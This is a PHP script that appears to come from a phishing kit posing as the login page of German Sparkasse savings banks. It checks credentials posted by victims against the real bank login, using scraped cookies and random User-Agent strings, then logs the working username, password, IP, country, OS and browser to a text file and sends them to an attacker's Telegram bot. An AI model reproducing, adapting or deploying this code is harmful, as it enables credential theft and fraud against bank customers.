<?php
session_start();
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('LOG_SMS_errors', '0');

include('../Config/911.php');
include('../Config/COUNTRY.php');
include('../Config/SYS.php');
include('../Config/TELEGRMAT.php');
$li = [];
$f = file("a.json");
foreach($f as $d){
$v = json_decode($d,true);
if($v["name"] == $_POST["bran"]){
array_push($li,$v["link"]);
}
}
$ex = explode("/",$li[0])[2];

$us = rand(5000000,200000000000000);
$ch = curl_init("{$li[0]}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch,CURLOPT_HTTPHEADER,array("User-Agent: {$us}"));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$response = curl_exec($ch);

$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$header = substr($response, 0, $header_size);
$body = substr($response, $header_size);

$x = explode('<form action="',$body);
$x1 = explode('"',$x[1])[0];
$y = explode('<input type="',$body);

//username metrix
$u = explode('name="',$y[4]);
$u1 = explode('"',$u[1])[0];

//password metrix
$p = explode('name="',$y[5]);
$p1 = explode('"',$p[1])[0];

//submit
$m = explode('name="',$y[6]);
$m2 = explode('"',$m[1])[0];

//remember metrix
$n1 = explode('name="',$y[7]);
$n2 = explode('"',$n1[1])[0]; //key
$n3 = explode('value="',$y[7]);
$n4 = explode('"',$n3[1])[0]; //value
$va = explode("field = document.getElementById('",$body);
$xi = explode("'",$va[1])[0];

$data = $xi."="."1"."&".$u1."=".$_POST['userid']."&".$p1."=".$_POST['password']."&".$m2."="."Anmelden"."&".$n2."=".$n4."&"."isJavaScriptActive=1";
 
$c = explode("Set-Cookie: ",$header);

if($c == NULL){
$c = explode("set-cookie: ",$header);
$lis = [];
foreach($c as $k){
$pu = explode(" ",$k)[0];
array_push($lis,$pu);
}

$cok = $lis[1]." ".$lis[2]." ".$lis[3]." ".$lis[4]." ".$lis[5]." ".$lis[6];
}else{
$lis = [];
foreach($c as $k){
$pu = explode(" ",$k)[0];
array_push($lis,$pu);
}
$cok = $lis[1]." ".$lis[2]." ".$lis[3]." ".$lis[4]." ".$lis[5]." ".$lis[6];
}

$us = rand(5000000,200000000000000);
$ch = curl_init("https://{$ex}{$x1}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch,CURLOPT_HTTPHEADER,array("Accept: ","Origin: https://www.sparkasse-vogtland.de","X-Requested-With: XMLHttpRequest","User-Agent: {$us}","Content-Type: application/x-www-form-urlencoded; charset=UTF-8","Cookie: {$cok}"));
$response = curl_exec($ch);

$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$header = substr($response, 0, $header_size);
$body = substr($response, $header_size);


$x = explode('<form action="',$body);
$x1 = explode('"',$x[1])[0];
$y = explode('<input type="',$body);

//username metrix
$u = explode('name="',$y[4]);
$u1 = explode('"',$u[1])[0];

//password metrix
$p = explode('name="',$y[5]);
$p1 = explode('"',$p[1])[0];
//submit
$m = explode('name="',$y[6]);
$m2 = explode('"',$m[1])[0];

//remember metrix
$n1 = explode('name="',$y[7]);
$n2 = explode('"',$n1[1])[0]; //key
$n3 = explode('value="',$y[7]);
$n4 = explode('"',$n3[1])[0]; //value
$va = explode("field = document.getElementById('",$body);
$xi = explode("'",$va[1])[0];

$data = $xi."="."1"."&".$u1."=".$_POST['userid']."&".$p1."=".$_POST['password']."&".$m2."="."Anmelden"."&".$n2."=".$n4."&"."isJavaScriptActive=1";
$us = rand(5000000,200000000000000);
$ch = curl_init("https://{$ex}{$x1}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch,CURLOPT_HTTPHEADER,array("User-Agent: {$us}","Accept: ","Origin: https://www.sparkasse-vogtland.de","X-Requested-With: XMLHttpRequest","Content-Type: application/x-www-form-urlencoded; charset=UTF-8","Cookie: {$cok}"));
$response = curl_exec($ch);

$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$header = substr($response, 0, $header_size);
$body = substr($response, $header_size);

$t = strpos($header,"login-online-banking");
$j = strpos($header,"IF6STCONTEXT");

if(($j != false)){
    if (isset($_POST['submit'])) {
        $message = "=====|SPVRKVSS-LO|=====\n";
        $message .= "= USER IS : ".$_POST['userid']."\n";
        $message .= "= PASS IS :".$_POST['password']."\n";
        $message .= "= BRANCH  : ".$li[0]."\n";
        $message .= "= VICO  : #$get_user_country\n";
        $message .= "= VICIP : $ip\n";
        $message .= "= VICSY : $user_os\n";
        $message .= "= VICBR : $user_browser\n";
        $message .= "= TIME  : $date\n";
        $message .= "=========================\n";
    
        $file = fopen('XD.txt', 'a');
        fwrite($file, $message . "\n");
        fclose($file);
    
        $data = [
            'text' => $message,
            'chat_id' => $chat_id,
        ];
    
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
    
        header('Location: ../Loa.php?cred=1sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG');
        exit;
    }
}else{
    header("Location: ../A.php?id=1&branch={$_POST['bran']}");
    exit;
}
?>